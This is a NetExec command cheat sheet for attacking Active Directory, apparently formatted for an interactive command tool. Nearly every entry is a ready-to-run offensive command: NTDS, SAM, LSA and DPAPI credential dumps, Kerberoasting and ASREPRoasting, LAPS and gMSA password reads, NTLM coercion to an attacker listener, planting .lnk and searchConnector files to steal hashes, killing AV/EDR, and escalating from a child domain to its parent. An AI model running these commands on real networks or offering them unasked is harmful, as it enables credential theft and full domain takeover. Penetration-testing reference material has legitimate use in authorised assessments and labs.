# Netexec

<!-- cheat
export nxc_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ authentication\ mode\ (Kerberos\ needs\ no\ credential)" --map "cut -f1"

if $auth_method != kerberos
var credential --- --header "Credential"
fi

if $auth_method == hash
var auth_flags := -H $credential
fi

if $auth_method == password
var auth_flags := -p $credential
fi

if $auth_method == kerberos
var auth_flags := -k --use-kcache
fi
-->

### Bloodhound collector ALL

Run the BloodHound `all` collection method (sessions, ACLs, GPOs, trusts, etc.) over LDAP against the domain, using the target's DNS for name resolution.

```sh title:"Full collection over LDAP, target DC as DNS resolver"
nxc ldap $domain -u $user $auth_flags --bloodhound -c all --dns-server $domain
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### User enumeration

Enumerate all domain users over LDAP and export the list to `users.txt` for later spraying, ASREPRoasting, or Kerberoasting.

```sh title:"Export to users.txt for spraying/roasting"
nxc ldap $domain -u $user $auth_flags --users-export users.txt
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Dump gMSA accounts

Retrieve managed service account passwords (ReadGMSAPassword) that the authenticated principal has rights to read. Classic privesc path when a user/group can read gMSA secrets.

```sh title:"Read ReadGMSAPassword-protected blobs via LDAP"
nxc ldap $domain -u $user $auth_flags --gmsa    
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Arbitrary LDAP query

Run an arbitrary LDAP filter against the domain - useful for targeted enumeration when the canned modules don't fit.

```sh title:"Execute a custom filter when canned modules don't fit"
nxc ldap $domain -u $user $auth_flags --query '$ldap_query' ""
```
<!-- cheat
import passwords
import domain_ip
import users
import ldap_query
import nxc_auth
-->

### ASREPRoast unauthenticated

Iterate a userlist with no password and collect AS-REP hashes for any account with Kerberos pre-auth disabled. Works without valid creds.

```sh title:"Spray userlist with empty password, no creds required"
nxc ldap $domain -u $users_file -p '' --asreproast asreproast.out
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ASREPRoast authenticated

Authenticated version - query LDAP for `DONT_REQ_PREAUTH` accounts and grab their AS-REP hashes for offline cracking.

```sh title:"Query LDAP for DONT_REQ_PREAUTH accounts with valid creds"
nxc ldap $domain -u $user $auth_flags --asreproast asreproast.out
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ADIDNS records

Pull DNS records from AD-integrated DNS (ADIDNS) to map internal hostnames, subnets, and services without port scanning.

```sh title:"Map internal hosts without port scanning (get-network module)"
nxc ldap $domain -u $user $auth_flags -M get-network -o ALL=true
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### LAPS passwords

Read LAPS (Local Administrator Password Solution) passwords via LDAP. Returns cleartext local admin passwords for any computer object the principal can read `ms-Mcs-AdmPwd` on.

```sh title:"Read ms-Mcs-AdmPwd cleartext from readable computer objects"
nxc ldap $domain -u $user $auth_flags -M laps
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Machine Account Quota

Check the domain's `ms-DS-MachineAccountQuota` value - if >0, any authenticated user can join machines to the domain (enables Resource-Based Constrained Delegation attacks).

```sh title:"Check ms-DS-MachineAccountQuota (RBCD prereq if >0)"
nxc ldap $domain -u $user $auth_flags -M maq
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### DCSync rights holders

Read the domain root DACL and find principals holding `DS-Replication-Get-Changes` / `-All` - i.e. who can DCSync.

```sh title:"Read domain DACL for Get-Changes / Get-Changes-All"
nxc ldap $domain -u $user $auth_flags -M daclread -o TARGET_DN="DC=inlanefreight,DC=htb" ACTION=read RIGHTS=DCSync
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

## nxc kerberoasting

### Kerberoasting

Request service tickets for all SPN-enabled accounts and save TGS hashes for offline cracking.

```sh title:"Request TGS for every SPN-enabled account, save to file"
nxc ldap $domain -u $user $auth_flags --kerberoasting $hashes_file
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var hashes_file
-->

### Trusted for delegation

List accounts with unconstrained or constrained delegation flags set - these are high-value targets (compromise → domain compromise in many cases).

```sh title:"List unconstrained/constrained delegation principals"
nxc ldap $domain -u $user $auth_flags --trusted-for-delegation
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

## nxc config generation

### Generate krb5.conf

Generate a `/etc/krb5.conf` pointed at the target DC so Kerberos tooling (impacket, rubeus via wine, etc.) can request tickets without manual config editing.

```sh title:"Write config pointed at target DC, move to /etc/"
nxc smb $domain -u $user $auth_flags --generate-krb5-file krb5.conf && sudo mv krb5.conf /etc/krb5.conf
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

## nxc mssql

### MSSQL Query

Run an arbitrary T-SQL query against an MSSQL instance using the authenticated principal.

```sh title:"Execute any T-SQL string against the instance"
nxc mssql $domain -u $user $auth_flags -q $query
```
<!-- cheat
import domain_ip
var user
var auth_flags
var query
-->

### MSSQL sysadmin members

List members of the `sysadmin` fixed server role - those accounts can execute `xp_cmdshell` and reach OS code execution.

```sh title:"sp_helpsrvrolemember finds xp_cmdshell capable accounts"
nxc mssql $domain -u $user $auth_flags -q "EXEC sp_helpsrvrolemember 'sysadmin';"
```
<!-- cheat
import domain_ip
var user
var auth_flags
-->

### MSSQL logins

Enumerate all SQL logins on the instance to find misconfigured accounts and potential lateral movement targets.

```sh title:"enum_logins module finds lateral movement candidates"
nxc mssql $domain -u $user $auth_flags -M enum_logins
```
<!-- cheat
import domain_ip
var user
var auth_flags
-->

### MSSQL Coercion

Trigger MSSQL to authenticate outbound to your listener (e.g. for ntlmrelayx). Works via `xp_dirtree` / `xp_fileexist` style UNC coercion.

```sh title:"xp_dirtree/xp_fileexist UNC trick to your listener"
nxc mssql $domain -u $user $auth_flags -M mssql_coerce -o LISTENER=$lhost
```
<!-- cheat
import domain_ip
var user
var auth_flags
var lhost
-->

### MSSQL databases

List all databases on the MSSQL instance - useful first step for data exfil and privesc via cross-database chaining.

```sh title:"SELECT from master.dbo.sysdatabases"
nxc mssql $domain -u $user $auth_flags -q 'SELECT name FROM master.dbo.sysdatabases;'
```
<!-- cheat
import domain_ip
var user
var auth_flags
-->

### Upload file to remote host

Upload a local file to the MSSQL server filesystem via the SQL service account (requires appropriate privileges).

```sh title:"--put-file writes via SQL service account privileges"
nxc mssql $domain -u $user $auth_flags --put-file $local_file_path $remote_file_path
```
<!-- cheat
import domain_ip
var user
var auth_flags
var local_file_path
var remote_file_path
-->

### Get user SIDs

RID-bruteforce up to 3000 and extract only user SIDs - handy when you have SQL auth but need domain usernames for spraying.

```sh title:"RID-brute to 3000 via MSSQL, filter SidTypeUser"
nxc mssql $domain -u $user $auth_flags --rid-brute 3000 | grep SidTypeUser | awk {'print $6'}
```
<!-- cheat
import domain_ip
var user
var auth_flags
-->

## nxc smb

### SMB Coercion

Coerce a target into authenticating to your listener over SMB using the `coerce_plus` module (chains MS-RPRN, MS-EFSR, MS-DFSNM, and others).

```sh title:"coerce_plus chains PrinterBug, PetitPotam, DFSCoerce"
nxc smb $domain -u $user $auth_flags -M coerce_plus -o LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### generate-tgt - alternative to impacket getTGT

Request a TGT and save it as a ccache file - drop-in replacement for impacket's `getTGT.py`, useful when you already have the nxc session.

```sh title:"Save TGT as ccache file, replaces impacket getTGT.py"
nxc smb $domain -u $user $auth_flags -k --generate-tgt ./$ccache_file_name
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var ccache_file_name
-->

### Timeroast

Exploit Windows Time NTP authentication to extract RC4-HMAC hashes for every machine account - unauthenticated password recovery vector on legacy DCs.

```sh title:"Extract RC4-HMAC via NTP, works pre auth on legacy DCs"
nxc smb $domain -u $user $auth_flags -M timeroast
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Get user shares

List SMB shares on the target and show read/write permissions for the authenticated user.

```sh title:"--shares with R/W flags for current principal"
nxc smb $domain -u $user $auth_flags --shares
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### List folders in a share

Browse the top level of a named share to see which directories exist before spidering.

```sh title:"Browse share root before committing to spider"
nxc smb $domain -u $user $auth_flags --share $share_name --dir
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
-->

### List files in a share folder

Drill into a specific folder inside a share to list its files.

```sh title:"Drill into specific path inside share"
nxc smb $domain -u $user $auth_flags --share $share_name --dir $folder_path
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
var folder_path
-->

### get file from share

Download a specific file from an SMB share to the local filesystem.

```sh title:"--get-file pulls one file to local disk"
nxc smb $domain -u $user $auth_flags --share $share_name --get-file $file $file
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
var file
-->

### Dump NTDS

Dump the `NTDS.dit` database (every domain account's NT hash) - requires DA or equivalent DCSync rights.

```sh title:"Pull every domain NT hash, requires DCSync rights"
nxc smb $domain -u $user $auth_flags --ntds
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Get user SIDs

RID-brute the target over SMB and extract user SIDs only - great for populating a userlist from a single working credential.

```sh title:"RID-brute to 3000 via SMB, filter SidTypeUser"
nxc smb $domain -u $user $auth_flags --rid-brute 3000 | grep SidTypeUser | awk {'print $6'}
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Add user to local admin group

Execute `net localgroup administrators /add` on the target to promote a domain user to local admin. Requires existing local admin on the target.

```sh title:"net localgroup administrators /add via remote shell"
nxc smb $domain -u $user $auth_flags -x 'net localgroup administrators $domain_user /add'
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Coerce authentication via PetitPotam

Force the target to authenticate to your listener using the PetitPotam (MS-EFSR) coercion method specifically.

```sh title:"MS-EFSR method only, pin via METHOD= option"
nxc smb $domain -u $user $auth_flags -M coerce_plus -o LISTENER=$lhost METHOD=PetitPotam
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var lhost
-->

### password policys

Pull the domain password policy (min length, complexity, lockout threshold) - know this before spraying so you don't lock accounts.

```sh title:"Check lockout threshold before you start spraying"
nxc smb $domain -u $user $auth_flags --pass-pol
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Get Group Policy Preference AutoLogon

Search SYSVOL for GPP AutoLogin XML files containing cleartext local admin passwords - legacy but still found.

```sh title:"Scan SYSVOL for AutoLogin XML cleartext creds"
nxc smb $domain -u $user $auth_flags -M gpp_autologin
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Get Group Policy Preference Password

Search SYSVOL for legacy `Groups.xml` cpassword blobs (MS14-025) and decrypt them with the public AES key.

```sh title:"Decrypt cpassword blobs with the public AES key (MS14-025)"
nxc smb $domain -u $user $auth_flags -M gpp_password
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Logged on users

List currently logged-on users on the target - useful for BloodHound session data and lateral movement planning.

```sh title:"Active sessions feed BloodHound and lateral planning"
nxc smb $domain -u $user $auth_flags --loggedon-users
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Spider shares

Recursively walk a share, index everything, and save metadata + interesting files for offline triage.

```sh title:"spider_plus recursive walk, save metadata and hits"
nxc smb $domain -u $user $auth_flags -M spider_plus --share $share_name
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
-->

### Network connections (IPs/FQDN)

Pull every IP the target has bound (IPv4, IPv6, secondary addresses) plus its FQDN - useful for finding hosts behind NAT or on multiple VLANs.

```sh title:"Find hosts behind NAT or on multiple VLANs"
nxc smb $domain -u $user $auth_flags -M get_netconnections
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### slinky LNK NTLM Theft

Drop a malicious `.lnk` file in a writable share that coerces NTLM auth to your listener whenever the folder is browsed (icon load trigger).

```sh title:"Writable share .lnk icon load fires auth to listener"
nxc smb $domain -u $user $auth_flags -M slinky -o SERVER=$lhost NAME=$lnk_name
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
import tun_ip
var lnk_name
-->

### ntlm replay list

Generate an ntlmrelayx-compatible target list filtered to hosts with SMB signing disabled (relay candidates).

```sh title:"Filter to signing-disabled hosts for ntlmrelayx -tf"
nxc smb $domain -u $user $auth_flags --gen-relay-list relay.txt
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### .searchConnector-ms and .library-ms files NTLM Theft

Drop `.searchConnector-ms` / `.library-ms` files in a writable share - opens auto-auth to your UNC path when the folder is browsed, no click required.

```sh title:"drop-sc plants zero-click auto-auth files in share"
nxc smb $domain -u $user $auth_flags -M drop-sc -o URL=\\\\$lhost\\secret SHARE=$share_name FILENAME=secret
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
-->

### Backup Operators hive dump

Abuse Backup Operators group membership to read protected registry hives (SAM/SECURITY/SYSTEM) and dump credentials without being a full admin.

```sh title:"Read SAM/SECURITY/SYSTEM hives without full admin"
nxc smb $domain -u $user $auth_flags -M backup_operator
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Remote qwinsta

Run `qwinsta` remotely to show session info (interactive, RDP, disconnected) - requires local admin on the target.

```sh title:"Show interactive/RDP/disconnected sessions, needs local admin"
nxc smb $domain -u $user $auth_flags --qwinsta
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Dump SAM

Dump local SAM hashes from the target. `regdump` reads the live registry; `secdump` parses an offline copy.

```sh title:"Dump SAM hashes (regdump live or secdump offline)"
nxc smb $domain -u $user $auth_flags --sam
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Dump LSA secrets

Dump LSA secrets (service account passwords, machine account password, DPAPI system keys).

```sh title:"Dump LSA secrets (service / machine pwd / DPAPI sys)"
nxc smb $domain -u $user $auth_flags --lsa
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### NTDS via VSS

Dump NTDS.dit using a VSS snapshot instead of DRSUAPI. Useful when DRSUAPI is blocked or monitored.

```sh title:"Dump NTDS via VSS snapshot when DRSUAPI is blocked"
nxc smb $domain -u $user $auth_flags --ntds vss
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### NTDS with history

Dump NTDS plus password history. History columns crack into previously-used passwords (good for spraying laterally).

```sh title:"NTDS dump including password history columns"
nxc smb $domain -u $user $auth_flags --ntds --history
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### NTDS with Kerberos keys

Dump NTDS plus Kerberos AES and DES keys. Required for forging tickets that use AES (Server 2012+ default).

```sh title:"NTDS dump with AES/DES Kerberos keys (golden ticket)"
nxc smb $domain -u $user $auth_flags --ntds --kerberos-keys
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### NTDS enabled only

Dump NTDS, filtered to enabled accounts only. Skips disabled / tombstoned noise.

```sh title:"NTDS dump filtered to enabled accounts only"
nxc smb $domain -u $user $auth_flags --ntds --enabled
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### NTDS one user

Dump NTDS for a single named account. Targeted alternative to a full dump.

```sh title:"Targeted NTDS dump for one named account"
nxc smb $domain -u $user $auth_flags --ntds --user $target_user
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var target_user
-->

### Dump DPAPI

Dump DPAPI secrets (saved credentials, browser cookies). Add `cookies` to also pull browser cookies; `nosystem` skips SYSTEM DPAPI.

```sh title:"Dump DPAPI secrets (creds + optional browser cookies)"
nxc smb $domain -u $user $auth_flags --dpapi
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Dump SCCM secrets

Dump SCCM secrets via WMI or disk. NAA / OSD / Task Sequence creds end up here.

```sh title:"Dump SCCM secrets (NAA / OSD / Task Sequence creds)"
nxc smb $domain -u $user $auth_flags --sccm
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### List VSS snapshots

List Volume Shadow Copy snapshots on the target (default ADMIN$). Useful for finding old NTDS / SAM copies.

```sh title:"List VSS snapshots, hunt for old NTDS / SAM copies"
nxc smb $domain -u $user $auth_flags --list-snapshots
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Filter shares by access

Enumerate shares filtered to a chosen access level (READ, WRITE, READ,WRITE).

```sh title:"Enumerate shares filtered to chosen access level"
nxc smb $domain -u $user $auth_flags --shares --filter-shares READ,WRITE
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Exclude shares

Enumerate shares while excluding noisy default shares.

```sh title:"Enumerate shares, exclude noisy defaults"
nxc smb $domain -u $user $auth_flags --shares --exclude-shares C$ ADMIN$ IPC$
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Skip share write check

Enumerate shares without the active write probe. Avoids leaving traces when delete permissions are missing.

```sh title:"Share enum without active write probe (low trace)"
nxc smb $domain -u $user $auth_flags --shares --no-write-check
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### List path content

List the contents of a path on the target (defaults to root).

```sh title:"List contents of a path on target (default root)"
nxc smb $domain -u $user $auth_flags --dir $folder_path
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var folder_path
-->

### Network interfaces

Enumerate the target's network interfaces (IPs, masks, gateways).

```sh title:"Enumerate target network interfaces (IP/mask/gw)"
nxc smb $domain -u $user $auth_flags --interfaces
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Disks

Enumerate physical / logical disks on the target.

```sh title:"Enumerate target disks (physical / logical)"
nxc smb $domain -u $user $auth_flags --disks
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Domain users (SMB)

Enumerate domain users over SMB / SAMR. Pass a username to query just that one.

```sh title:"Enumerate domain users via SAMR (or just one)"
nxc smb $domain -u $user $auth_flags --users
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Domain groups (SMB)

Enumerate domain groups over SMB. Pass a group name to enumerate its members.

```sh title:"Enumerate domain groups via SAMR (or members of one)"
nxc smb $domain -u $user $auth_flags --groups
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Local groups

Enumerate local groups on the target. Pass a group name to enumerate its members.

```sh title:"Enumerate local groups on target (or members of one)"
nxc smb $domain -u $user $auth_flags --local-groups
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Computers (SMB)

Enumerate domain computer accounts over SMB.

```sh title:"Enumerate domain computer accounts over SMB"
nxc smb $domain -u $user $auth_flags --computers
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### SMB sessions

Enumerate active SMB sessions on the target. Maps where users are connected from.

```sh title:"Active SMB sessions, maps connection origins"
nxc smb $domain -u $user $auth_flags --smb-sessions
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Registry sessions

Enumerate user sessions via Remote Registry HKU keys. Filter by username, file, or list all.

```sh title:"User sessions via Remote Registry HKU enumeration"
nxc smb $domain -u $user $auth_flags --reg-sessions
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Logged-on user filter

Enumerate logged-on users with a regex filter applied to the username.

```sh title:"Logged-on users filtered by username regex"
nxc smb $domain -u $user $auth_flags --loggedon-users-filter $regex
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var regex
-->

### Process list

Enumerate running processes on the target. Pass a name to filter.

```sh title:"List running processes on target (filter by name)"
nxc smb $domain -u $user $auth_flags --tasklist
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Kill process

Kill a process by PID or name on the target. Useful for stopping AV / EDR before staging payloads.

```sh title:"Kill PID or named process (AV/EDR stop primitive)"
nxc smb $domain -u $user $auth_flags --taskkill $proc
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var proc
-->

### WMI query

Run an arbitrary WMI query against the target.

```sh title:"Run arbitrary WMI query against target"
nxc smb $domain -u $user $auth_flags --wmi-query "$wmi_query" --wmi-namespace 'root\cimv2'
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var wmi_query
-->

### Spider share

Recursively spider a named share. Default depth, no content search.

```sh title:"Recursive share spider, default depth, no content"
nxc smb $domain -u $user $auth_flags --spider $share_name
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
-->

### Spider with pattern

Spider a share and grep filenames + content for a pattern. The bread-and-butter cred-hunt mode.

```sh title:"Spider share + content grep for pattern (cred hunt)"
nxc smb $domain -u $user $auth_flags --spider $share_name --content --pattern $pattern --depth $depth
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
var pattern
var depth
-->

### Spider with regex

Spider a share applying a regex against filenames and file content.

```sh title:"Spider share with regex over names and content"
nxc smb $domain -u $user $auth_flags --spider $share_name --content --regex $regex --depth $depth
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
var regex
var depth
-->

### Put file to share

Push a local file to a path on the target via SMB.

```sh title:"Push local file to a target path via SMB"
nxc smb $domain -u $user $auth_flags --put-file $local_file_path $remote_file_path
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var local_file_path
var remote_file_path
-->

## nxc ldap modules

### adcs

Find PKI Enrollment Services in AD and list certificate template names. Cheap pre-flight before reaching for certipy.

```sh title:"Find ADCS CAs and template names via LDAP"
nxc ldap $domain -u $user $auth_flags -M adcs
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### badsuccessor

Check if the domain is vulnerable to the badSuccessor primitive (dMSA migration takeover).

```sh title:"Check vulnerability to badSuccessor dMSA takeover"
nxc ldap $domain -u $user $auth_flags -M badsuccessor
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### certipy-find

Run certipy `find` from inside nxc with options to export results to text/csv/json. Defaults to vulnerable templates only.

```sh title:"Run certipy find via nxc, default to vulnerable templates"
nxc ldap $domain -u $user $auth_flags -M certipy-find
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### dns-nonsecure

Detect ADIDNS zones that allow nonsecure dynamic updates. Anyone authenticated can write records into a nonsecure zone.

```sh title:"ADIDNS zones with nonsecure dynamic updates"
nxc ldap $domain -u $user $auth_flags -M dns-nonsecure
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### dump-computers

Dump FQDN and OS for every computer in the domain. Quick OS inventory.

```sh title:"FQDN + OS for every computer in domain"
nxc ldap $domain -u $user $auth_flags -M dump-computers
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### entra-id

Find the Entra ID sync server. High-value box because it holds the AD Connect MSOL credential.

```sh title:"Find Entra ID Connect sync server (MSOL credential host)"
nxc ldap $domain -u $user $auth_flags -M entra-id
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### find-computer

Find computer objects matching a text fragment. Faster than crafting a custom LDAP query when you just want a name match.

```sh title:"Find computers matching free-text fragment"
nxc ldap $domain -u $user $auth_flags -M find-computer -o NAME=$search
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var search
-->

### get-scriptpath

Pull the `scriptPath` attribute from every user. Logon scripts on SYSVOL sometimes contain creds or pointers to interesting shares.

```sh title:"scriptPath for every user (logon-script paths)"
nxc ldap $domain -u $user $auth_flags -M get-scriptpath
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### groupmembership

List groups a specific user belongs to.

```sh title:"List groups a specific user belongs to"
nxc ldap $domain -u $user $auth_flags -M groupmembership -o USER=$target_user
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var target_user
-->

### obsolete

Extract obsolete operating systems from LDAP. Out-of-support hosts are immediate vuln candidates.

```sh title:"Out-of-support OSes via LDAP, vuln candidate list"
nxc ldap $domain -u $user $auth_flags -M obsolete
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### pso

Read Fine-Grained Password Policies (PSOs). Often laxer than the default policy on legacy/service accounts.

```sh title:"Read Fine-Grained Password Policies (PSOs)"
nxc ldap $domain -u $user $auth_flags -M pso
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### sccm

Find SCCM infrastructure published in AD. Pivot point for credential extraction (NAA, OSD, PXE).

```sh title:"Find SCCM infra in AD (NAA / OSD / PXE pivot)"
nxc ldap $domain -u $user $auth_flags -M sccm
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### subnets

Enumerate AD Sites and Subnets. Maps the network from AD's perspective without scanning.

```sh title:"AD Sites + Subnets, network map without scanning"
nxc ldap $domain -u $user $auth_flags -M subnets
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### whoami

Get details on the authenticated principal (group memberships, attributes).

```sh title:"Details on authenticated principal (groups + attrs)"
nxc ldap $domain -u $user $auth_flags -M whoami
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### get-desc-users

Pull the `description` field from every user. Lazy admins sometimes drop passwords here.

```sh title:"description field for every user, scan for creds"
nxc ldap $domain -u $user $auth_flags -M get-desc-users
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### get-info-users

Pull the `info` (notes) field from every user. Same hunt as descriptions.

```sh title:"info/notes field for every user, scan for creds"
nxc ldap $domain -u $user $auth_flags -M get-info-users
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### get-unixUserPassword

Dump `unixUserPassword` attribute from every user. Often overlooked legacy attribute holding cleartext.

```sh title:"unixUserPassword attribute (legacy cleartext store)"
nxc ldap $domain -u $user $auth_flags -M get-unixUserPassword
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### get-userPassword

Dump the `userPassword` attribute from every user. Rarely populated on Windows DCs but high payoff when it is.

```sh title:"userPassword attribute (rare but high payoff)"
nxc ldap $domain -u $user $auth_flags -M get-userPassword
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### user-desc

Targeted scan of user descriptions for credential-shaped strings.

```sh title:"Scan user descriptions for credential strings"
nxc ldap $domain -u $user $auth_flags -M user-desc
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### add-computer

Add (or delete) a domain computer via SAMR or LDAPS. Required for RBCD and Shadow Credentials when MachineAccountQuota > 0.

```sh title:"Add domain computer via SAMR/LDAPS for RBCD"
nxc ldap $domain -u $user $auth_flags -M add-computer -o NAME=$rhost_name PASSWORD=$target_pass
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var rhost_name
var target_pass
-->

### modify-group

Modify group membership for users or computers via LDAP. Usable when you have GenericWrite/GenericAll on the group.

```sh title:"Modify group membership via LDAP write rights"
nxc ldap $domain -u $user $auth_flags -M modify-group -o GROUP=$group_name USER=$target_user ACTION=add
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var group_name
var target_user
-->

### pre2k

Identify pre-Windows-2000-compatible computer accounts (default password = lowercase samaccountname) and request TGTs for each.

```sh title:"pre-W2k computer accounts, password == samaccountname"
nxc ldap $domain -u $user $auth_flags -M pre2k
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### raisechild (HIGH)

Compromise the parent domain from a child domain via inter-realm trust abuse. Requires DA in the child.

```sh title:"Child to parent domain compromise via trust (needs DA)"
nxc ldap $domain -u $user $auth_flags -M raisechild
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

## nxc smb modules

### enum_av

Identify endpoint protection products on the target via LsarLookupNames. No privilege required.

```sh title:"Identify EPP/AV/EDR via LsarLookupNames, no privs"
nxc smb $domain -u $user $auth_flags -M enum_av
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_ca

Anonymously hunt for ADCS CAs over RPC endpoints.

```sh title:"Anonymously hunt ADCS CAs over RPC endpoints"
nxc smb $domain -u $user $auth_flags -M enum_ca
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_cve

Enumerate common CVEs by querying registry OS version + UBR. Quick way to triage missing patches.

```sh title:"Enumerate CVEs from registry OS version + UBR"
nxc smb $domain -u $user $auth_flags -M enum_cve
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### gpp_privileges

Extract privileges assigned via GPOs and resolve SIDs through LDAP. Maps GPO-granted SeDebug etc.

```sh title:"GPO-assigned privileges with SIDs resolved via LDAP"
nxc smb $domain -u $user $auth_flags -M gpp_privileges
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ioxidresolver

Identify additional active network interfaces on the host (multi-homed boxes, hidden subnets).

```sh title:"Find multi-homed hosts via IOXIDResolver"
nxc smb $domain -u $user $auth_flags -M ioxidresolver
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ms17-010

Check for MS17-010 (EternalBlue) exposure. Untested for exploitation, vuln check only.

```sh title:"Check MS17-010 EternalBlue exposure (vuln check)"
nxc smb $domain -u $user $auth_flags -M ms17-010
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### nopac

Check if the DC is vulnerable to NoPac (CVE-2021-42278/42287). Domain user to DA path.

```sh title:"Check NoPac (CVE-2021-42278/42287) DA escalation"
nxc smb $domain -u $user $auth_flags -M nopac
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntlm_reflection

Check whether the OS is vulnerable to NTLM reflection (CVE-2025-33073).

